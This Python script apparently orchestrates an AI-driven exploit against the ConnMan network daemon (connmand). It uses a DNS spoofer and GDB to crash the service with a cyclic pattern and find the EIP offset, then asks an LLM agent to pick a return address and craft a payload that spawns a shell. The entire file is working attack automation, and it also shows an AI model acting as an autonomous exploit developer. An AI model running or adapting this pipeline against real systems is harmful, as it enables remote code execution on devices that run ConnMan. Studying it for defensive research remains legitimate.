# main.py
import subprocess
import time
import json
from dotenv import load_dotenv
from agent import ExploitAgent

# Load environment variables from .env file
load_dotenv()

TARGET_PATH = "./target/connmand"

def run_phase(phase_name, function, *args):
    """Helper function to run a phase and print status."""
    print(f"--- 🚀 PHASE: {phase_name} ---")
    result = function(*args)
    if result:
        print(f"--- ✅ SUCCESS: {phase_name} ---")
        return result
    else:
        print(f"--- ❌ FAILED: {phase_name} ---")
        exit(1)

def phase_1_find_offset(agent):
    """Crashes the program to find the EIP offset."""
    gdb_server = subprocess.Popen(
        ['python3', 'gdb_mcp_server.py', TARGET_PATH],
        stdin=subprocess.PIPE, stdout=subprocess.PIPE, text=True
    )
    time.sleep(2) # Give GDB time to start up

    # Generate a unique pattern and send it via the DNS spoofer
    pattern = agent.generate_cyclic_pattern(1200)
    subprocess.run(['python3', 'dns_spoofer.py', '--payload', pattern.encode().hex()])
    
    # Trigger connman's DNS lookup
    subprocess.run(['dig', '@127.0.0.1', 'dos.com'], capture_output=True)
    
    # Ask the GDB server for the crash info
    gdb_server.stdin.write("get_crash_info\n")
    gdb_server.stdin.flush()
    
    response_str = gdb_server.stdout.readline()
    gdb_server.kill()

    offset = agent.analyze_crash_and_get_offset(response_str)
    print(f"Agent determined offset: {offset}")
    return offset

def phase_2_get_shell(agent, offset):
    """Selects a return address and injects the final payload."""
    gdb_server = subprocess.Popen(
        ['python3', 'gdb_mcp_server.py', TARGET_PATH],
        stdin=subprocess.PIPE, stdout=subprocess.PIPE, text=True
    )
    time.sleep(2)

    # First, get a stable ESP value by sending a simple crash payload
    control_payload = b'A' * offset + b'B' * 4
    subprocess.run(['python3', 'dns_spoofer.py', '--payload', control_payload.hex()])
    subprocess.run(['dig', '@127.0.0.1', 'dos.com'], capture_output=True)

    gdb_server.stdin.write("get_crash_info\n")
    gdb_server.stdin.flush()
    response_str = gdb_server.stdout.readline()
    
    # Restart the process in GDB to get a clean stack for the final shot
    gdb_server.kill()
    gdb_server = subprocess.Popen(
        ['python3', 'gdb_mcp_server.py', TARGET_PATH],
        stdin=subprocess.PIPE, stdout=subprocess.PIPE, text=True
    )
    time.sleep(2)

    return_address = agent.select_return_address(response_str)
    print(f"Agent selected return address: {hex(return_address)}")

    final_payload = agent.craft_final_payload(offset, return_address)
    
    # Send the final payload
    subprocess.run(['python3', 'dns_spoofer.py', '--payload', final_payload.hex()])
    subprocess.run(['dig', '@127.0.0.1', 'dos.com'], capture_output=True)

    # Ask GDB to continue and check if a shell was spawned
    gdb_server.stdin.write("check_shell\n")
    gdb_server.stdin.flush()
    
    response_str = gdb_server.stdout.readline()
    gdb_server.kill()
    
    try:
        response_json = json.loads(response_str)
        if response_json.get('shell_active'):
            print("SHELL SPAWNED! Exploit successful.")
            return True
    except json.JSONDecodeError:
        print(f"Error decoding GDB response: {response_str}")
        return False
    return False

def main():
    agent = ExploitAgent(model_name="openai/gpt-4o")
    
    offset = run_phase("Find EIP Offset", phase_1_find_offset, agent)
    run_phase("Get Shell", phase_2_get_shell, agent, offset)
    
    print("\n🎉 Exploit sequence complete.")

if __name__ == "__main__":
    main()